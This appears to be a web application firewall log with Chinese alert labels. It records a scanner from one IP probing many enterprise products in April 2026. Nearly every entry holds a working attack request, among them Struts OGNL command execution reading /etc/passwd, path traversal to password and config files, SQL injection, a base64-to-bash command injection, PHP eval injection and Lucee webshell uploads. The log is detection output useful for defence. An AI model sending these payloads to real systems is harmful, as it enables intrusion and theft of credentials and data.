[2026-04-02 10:12:16] IP: 106.227.72.11 | URL: /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D | 发现恶意特征在 GET 参数: id
[2026-04-02 10:12:40] IP: 106.227.72.11 | URL: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd | 发现恶意特征在 GET 参数: sbFileName
[2026-04-02 10:12:40] IP: 106.227.72.11 | URL: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp | 发现恶意特征在 GET 参数: inputFile
[2026-04-02 10:12:41] IP: 106.227.72.11 | URL: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5(204594513),7-- | 发现恶意特征在 GET 参数: attach_ids
[2026-04-02 10:12:42] IP: 106.227.72.11 | URL: /common/download/resource?resource=/profile/../../../../etc/passwd | 发现恶意特征在 GET 参数: resource
[2026-04-02 10:12:42] IP: 106.227.72.11 | URL: /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: target
[2026-04-02 10:12:42] IP: 106.227.72.11 | URL: /common/download/resource?resource=/profile/../../../../Windows/win.ini | 发现恶意特征在 GET 参数: resource
[2026-04-02 10:12:47] IP: 106.227.72.11 | URL: /index.php/bbs/index/download?url=/etc/passwd&amp;name=1.txt&amp;local=1 | 发现恶意特征在 GET 参数: url
[2026-04-02 10:12:47] IP: 106.227.72.11 | URL: /webui/?g=sys_dia_data_down&amp;file_name=../../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: file_name
[2026-04-02 10:12:48] IP: 106.227.72.11 | URL: /checkValid | 发现恶意特征在 POST 参数: document
[2026-04-02 10:12:48] IP: 106.227.72.11 | URL: /api/geojson?url=file:/etc/passwd | 发现恶意特征在 GET 参数: url
[2026-04-02 10:12:50] IP: 106.227.72.11 | URL: /q?start=2000/10/21-00:00:00&amp;end=2020/12/25-00:00:00&amp;m=sum:EGn.vJl.kJW&amp;o=&amp;yrange=[0:system(&#039;echo%20-e%20&quot;ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg==&quot;%20|%20base64%20-d%20|bash&#039;)]&amp;wxh=1698x316&amp;style=linespoint&amp;json | 发现恶意特征在 GET 参数: yrange
[2026-04-02 10:12:50] IP: 106.227.72.11 | URL: /?/member/cart/Fastpay&amp;shopid=-1%20union%20select%20md5(2054551306),2,3,4%20--+ | 发现恶意特征在 GET 参数: shopid
[2026-04-02 10:12:51] IP: 106.227.72.11 | URL: /lucee/admin/imgProcess.cfm?file=/../../../context/mPjtho.cfm | 发现恶意特征在 GET 参数: file
[2026-04-02 10:12:51] IP: 106.227.72.11 | URL: /lucee/mPjtho.cfm | 发现恶意特征在 POST 参数: cmd
[2026-04-02 10:12:52] IP: 106.227.72.11 | URL: /eam/vib?id=/etc/passwd | 发现恶意特征在 GET 参数: id
[2026-04-02 10:12:52] IP: 106.227.72.11 | URL: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd | 发现恶意特征在 GET 参数: filePath
[2026-04-02 10:12:53] IP: 106.227.72.11 | URL: /cgi-bin/wapopen?B1=OK&amp;NO=CAM_16&amp;REFRESH_TIME=Auto_00&amp;FILECAMERA=../../etc/passwd%00&amp;REFRESH_HTML=auto.htm&amp;ONLOAD_HTML=onload.htm&amp;STREAMING_HTML=streaming.htm&amp;NAME=admin&amp;PWD=admin&amp;PIC_SIZE=0 | 发现恶意特征在 GET 参数: FILECAMERA
[2026-04-02 10:13:00] IP: 106.227.72.11 | URL: / | 发现恶意特征在 COOKIE 参数: PHPSESSID
[2026-04-02 10:13:03] IP: 106.227.72.11 | URL: /Ajax/AjaxMethod.ashx?action=getEmpByname&amp;Name=Y&#039;+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES(&#039;MD5&#039;,&#039;14569&#039;)),3,32)-- | 发现恶意特征在 GET 参数: Name
[2026-04-02 10:13:03] IP: 106.227.72.11 | URL: /index.php?op=fileviewer&amp;file=/etc/passwd | 发现恶意特征在 GET 参数: file
[2026-04-02 10:13:04] IP: 106.227.72.11 | URL: /index.php?op=fileviewer&amp;file=/etc/passwd | 发现恶意特征在 GET 参数: file
[2026-04-02 10:13:04] IP: 106.227.72.11 | URL: /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ | 发现恶意特征在 GET 参数: path
[2026-04-02 10:13:06] IP: 106.227.72.11 | URL: /servlet/dataSphereServlet?action=38 | 发现恶意特征在 POST 参数: path
[2026-04-02 10:13:07] IP: 127.0.0.1 | URL: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 | 发现恶意特征在 GET 参数: ids
[2026-04-02 10:13:07] IP: 106.227.72.11 | URL: /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:13:07] IP: 127.0.0.1 | URL: /?g=pki_file_download&amp;filename=../../../../../etc/passwd | 发现恶意特征在 GET 参数: filename
[2026-04-02 10:13:07] IP: 106.227.72.11 | URL: /vpn/user/download/client?ostype=../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: ostype
[2026-04-02 10:13:07] IP: 106.227.72.11 | URL: /modifyInsurance.htm?documentCode=1&amp;insuranceValue=1&amp;customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) | 发现恶意特征在 GET 参数: customerId
[2026-04-02 10:13:07] IP: 106.227.72.11 | URL: /ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29--+dpxi | 发现恶意特征在 GET 参数: code
[2026-04-02 10:13:08] IP: 106.227.72.11 | URL: /sys/ui/sys_ui_component/sysUiComponent.do | 发现恶意特征在 POST 参数: extendId
[2026-04-02 10:13:10] IP: 106.227.72.11 | URL: /api/filemanager?path=%2F..%2f..%2f | 发现恶意特征在 GET 参数: path
[2026-04-02 10:13:10] IP: 106.227.72.11 | URL: /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st | 发现恶意特征在 GET 参数: sql
[2026-04-02 10:13:32] IP: 106.227.72.11 | URL: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: apis
[2026-04-02 10:13:33] IP: 106.227.72.11 | URL: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:13:33] IP: 106.227.72.11 | URL: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:13:33] IP: 106.227.72.11 | URL: /index.php?s=Admin-Data-down&amp;id=../../Conf/config.php | 发现恶意特征在 GET 参数: id
[2026-04-02 10:13:33] IP: 106.227.72.11 | URL: /systemController/showOrDownByurl.do?down=&amp;dbPath=../../../../../Windows/win.ini | 发现恶意特征在 GET 参数: dbPath
[2026-04-02 10:13:33] IP: 106.227.72.11 | URL: /systemController/showOrDownByurl.do?down=&amp;dbPath=../../../../../../etc/passwd | 发现恶意特征在 GET 参数: dbPath
[2026-04-02 10:13:34] IP: 106.227.72.11 | URL: /user/City_ajax.aspx?CityId=3&#039;union%20select%20sys.fn_sqlvarbasetostr(HashBytes(&#039;MD5&#039;,&#039;888888888888888&#039;)),2-- | 发现恶意特征在 GET 参数: CityId
[2026-04-02 10:13:34] IP: 106.227.72.11 | URL: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession | 发现恶意特征在 GET 参数: lang
[2026-04-02 10:13:34] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:13:34] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../windows/win.ini | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:13:34] IP: 106.227.72.11 | URL: /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en | 发现恶意特征在 GET 参数: locale
[2026-04-02 10:13:35] IP: 106.227.72.11 | URL: /mobile/browser/WorkflowCenterTreeData.jsp | 发现恶意特征在 POST 参数: formids
[2026-04-02 10:13:35] IP: 106.227.72.11 | URL: /cpt/manage/validate.jsp?sourcestring=validateNum | 发现恶意特征在 POST 参数: capitalid
[2026-04-02 10:13:35] IP: 106.227.72.11 | URL: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd | 发现恶意特征在 GET 参数: sbFileName
[2026-04-02 10:13:35] IP: 106.227.72.11 | URL: /menu/stapp | 发现恶意特征在 POST 参数: appname
[2026-04-02 10:13:36] IP: 106.227.72.11 | URL: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp | 发现恶意特征在 GET 参数: inputFile
[2026-04-02 10:13:36] IP: 106.227.72.11 | URL: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5(204540587),7-- | 发现恶意特征在 GET 参数: attach_ids
[2026-04-02 10:13:37] IP: 106.227.72.11 | URL: /common/download/resource?resource=/profile/../../../../etc/passwd | 发现恶意特征在 GET 参数: resource
[2026-04-02 10:13:37] IP: 106.227.72.11 | URL: /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: target
[2026-04-02 10:13:37] IP: 106.227.72.11 | URL: /common/download/resource?resource=/profile/../../../../Windows/win.ini | 发现恶意特征在 GET 参数: resource
[2026-04-02 10:13:38] IP: 106.227.72.11 | URL: /?s=%2Fa%2Fb%2Fc%2F%24%7B%40eval%28%24_GET%5B1%5D%29%7D | 发现恶意特征在 GET 参数: s
[2026-04-02 10:13:41] IP: 106.227.72.11 | URL: /?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-yakit%20 | 发现恶意特征在 GET 参数: contents
[2026-04-02 10:13:50] IP: 106.227.72.11 | URL: /webui/?g=sys_dia_data_down&amp;file_name=../../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: file_name
[2026-04-02 10:13:50] IP: 106.227.72.11 | URL: /index.php/bbs/index/download?url=/etc/passwd&amp;name=1.txt&amp;local=1 | 发现恶意特征在 GET 参数: url
[2026-04-02 10:13:50] IP: 106.227.72.11 | URL: /q?start=2000/10/21-00:00:00&amp;end=2020/12/25-00:00:00&amp;m=sum:gdf.kia.dxH&amp;o=&amp;yrange=[0:system(&#039;echo%20-e%20&quot;ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg==&quot;%20|%20base64%20-d%20|bash&#039;)]&amp;wxh=1698x316&amp;style=linespoint&amp;json | 发现恶意特征在 GET 参数: yrange
[2026-04-02 10:13:51] IP: 106.227.72.11 | URL: /checkValid | 发现恶意特征在 POST 参数: document
[2026-04-02 10:13:52] IP: 106.227.72.11 | URL: /manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../ | 发现恶意特征在 GET 参数: filename
[2026-04-02 10:13:56] IP: 106.227.72.11 | URL: /lucee/admin/imgProcess.cfm?file=/../../../context/msYDAi.cfm | 发现恶意特征在 GET 参数: file
[2026-04-02 10:13:56] IP: 106.227.72.11 | URL: /lucee/msYDAi.cfm | 发现恶意特征在 POST 参数: cmd
[2026-04-02 10:13:58] IP: 106.227.72.11 | URL: /?/member/cart/Fastpay&amp;shopid=-1%20union%20select%20md5(2079880431),2,3,4%20--+ | 发现恶意特征在 GET 参数: shopid
[2026-04-02 10:14:01] IP: 106.227.72.11 | URL: /eam/vib?id=/etc/passwd | 发现恶意特征在 GET 参数: id
[2026-04-02 10:14:01] IP: 106.227.72.11 | URL: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd | 发现恶意特征在 GET 参数: filePath
[2026-04-02 10:14:02] IP: 106.227.72.11 | URL: /cgi-bin/wapopen?B1=OK&amp;NO=CAM_16&amp;REFRESH_TIME=Auto_00&amp;FILECAMERA=../../etc/passwd%00&amp;REFRESH_HTML=auto.htm&amp;ONLOAD_HTML=onload.htm&amp;STREAMING_HTML=streaming.htm&amp;NAME=admin&amp;PWD=admin&amp;PIC_SIZE=0 | 发现恶意特征在 GET 参数: FILECAMERA
[2026-04-02 10:14:08] IP: 106.227.72.11 | URL: / | 发现恶意特征在 COOKIE 参数: PHPSESSID
[2026-04-02 10:14:10] IP: 106.227.72.11 | URL: /Ajax/AjaxMethod.ashx?action=getEmpByname&amp;Name=Y&#039;+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES(&#039;MD5&#039;,&#039;18531&#039;)),3,32)-- | 发现恶意特征在 GET 参数: Name
[2026-04-02 10:14:11] IP: 106.227.72.11 | URL: /index.php?op=fileviewer&amp;file=/etc/passwd | 发现恶意特征在 GET 参数: file
[2026-04-02 10:14:12] IP: 106.227.72.11 | URL: /index.php?op=fileviewer&amp;file=/etc/passwd | 发现恶意特征在 GET 参数: file
[2026-04-02 10:14:12] IP: 106.227.72.11 | URL: /api/geojson?url=file:/etc/passwd | 发现恶意特征在 GET 参数: url
[2026-04-02 10:14:12] IP: 106.227.72.11 | URL: /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ | 发现恶意特征在 GET 参数: path
[2026-04-02 10:14:14] IP: 106.227.72.11 | URL: /servlet/dataSphereServlet?action=38 | 发现恶意特征在 POST 参数: path
[2026-04-02 10:14:14] IP: 127.0.0.1 | URL: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 | 发现恶意特征在 GET 参数: ids
[2026-04-02 10:14:14] IP: 106.227.72.11 | URL: /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:14:14] IP: 127.0.0.1 | URL: /?g=pki_file_download&amp;filename=../../../../../etc/passwd | 发现恶意特征在 GET 参数: filename
[2026-04-02 10:14:14] IP: 106.227.72.11 | URL: /modifyInsurance.htm?documentCode=1&amp;insuranceValue=1&amp;customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) | 发现恶意特征在 GET 参数: customerId
[2026-04-02 10:14:15] IP: 106.227.72.11 | URL: /vpn/user/download/client?ostype=../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: ostype
[2026-04-02 10:14:15] IP: 106.227.72.11 | URL: /ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29--+dpxi | 发现恶意特征在 GET 参数: code
[2026-04-02 10:14:19] IP: 106.227.72.11 | URL: /sys/ui/sys_ui_component/sysUiComponent.do | 发现恶意特征在 POST 参数: extendId
[2026-04-02 10:14:23] IP: 106.227.72.11 | URL: /api/filemanager?path=%2F..%2f..%2f | 发现恶意特征在 GET 参数: path
[2026-04-02 10:14:23] IP: 106.227.72.11 | URL: /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st | 发现恶意特征在 GET 参数: sql
[2026-04-02 10:14:25] IP: 106.227.72.11 | URL: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ | 发现恶意特征在 GET 参数: dir
[2026-04-02 10:14:28] IP: 106.227.72.11 | URL: /emp/lang2sql?client_type=1&amp;lang_tag=1 | 发现恶意特征在 POST 参数: source
[2026-04-02 10:14:30] IP: 106.227.72.11 | URL: /sys/ui/sys_ui_component/sysUiComponent.do | 发现恶意特征在 POST 参数: extendId
[2026-04-02 10:14:31] IP: 106.227.72.11 | URL: /eoffice10/server/public/api/attachment/path/migrate | 发现恶意特征在 POST 参数: desc_path
[2026-04-02 10:14:31] IP: 106.227.72.11 | URL: /seeyon/wpsAssistServlet?flag=open&amp;fileId=-1233531&amp;fileType=/../../conf/datasourceCtp.properties | 发现恶意特征在 GET 参数: fileType
[2026-04-02 10:14:31] IP: 106.227.72.11 | URL: /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyAxNzEwMTI1MTUyOTEyOw==%22)))%3B/*&amp;id=19&amp;module=Carouselimage | 发现恶意特征在 GET 参数: activeTab
[2026-04-02 10:14:32] IP: 106.227.72.11 | URL: /u8qx/SmartUpload01.jsp | 发现恶意特征在 POST 参数: uname
[2026-04-02 10:14:32] IP: 106.227.72.11 | URL: /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D | 发现恶意特征在 GET 参数: id
[2026-04-02 10:14:32] IP: 106.227.72.11 | URL: /eoffice10/server/public/api/attachment/path/migrate | 发现恶意特征在 POST 参数: desc_path
[2026-04-02 10:14:38] IP: 106.227.72.11 | URL: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp | 发现恶意特征在 GET 参数: inputFile
[2026-04-02 10:14:38] IP: 106.227.72.11 | URL: /lucee/admin/imgProcess.cfm?file=/../../../context/awATuT.cfm | 发现恶意特征在 GET 参数: file
[2026-04-02 10:14:39] IP: 106.227.72.11 | URL: /lucee/awATuT.cfm | 发现恶意特征在 POST 参数: cmd
[2026-04-02 10:14:39] IP: 106.227.72.11 | URL: /index/ajax/lang?lang=../../application/database | 发现恶意特征在 GET 参数: lang
[2026-04-02 10:14:39] IP: 106.227.72.11 | URL: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ | 发现恶意特征在 GET 参数: dir
[2026-04-02 10:14:40] IP: 106.227.72.11 | URL: /ssl-vpn/hipreport.esp | 发现恶意特征在 COOKIE 参数: SESSID
[2026-04-02 10:14:43] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../windows/win.ini | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:14:44] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:14:45] IP: 106.227.72.11 | URL: /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd | 发现恶意特征在 GET 参数: puser
[2026-04-02 10:14:47] IP: 106.227.72.11 | URL: /?s=%2Fa%2Fb%2Fc%2F%24%7B%40eval%28%24_GET%5B1%5D%29%7D | 发现恶意特征在 GET 参数: s
[2026-04-02 10:14:47] IP: 106.227.72.11 | URL: /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay&#039;0%3A0%3A10&#039;%2F**%2F | 发现恶意特征在 GET 参数: docId
[2026-04-02 10:14:52] IP: 106.227.72.11 | URL: /kp/PrintZPYG.jsp?zpjhid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13,14+--+ | 发现恶意特征在 GET 参数: zpjhid
